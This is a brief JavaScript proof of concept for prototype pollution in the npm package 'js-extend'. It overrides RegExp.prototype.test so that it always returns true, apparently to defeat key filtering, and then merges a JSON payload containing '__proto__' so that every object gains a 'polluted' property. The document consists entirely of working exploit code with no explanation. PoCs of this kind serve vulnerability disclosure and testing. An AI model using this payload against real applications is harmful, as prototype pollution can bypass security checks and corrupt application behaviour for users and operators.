RegExp.prototype.test = () => true;
console.log({}.polluted);
const jsExtend = require('js-extend');
const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
jsExtend.extend({}, JSON.parse(malicious_payload));
console.log({}.polluted);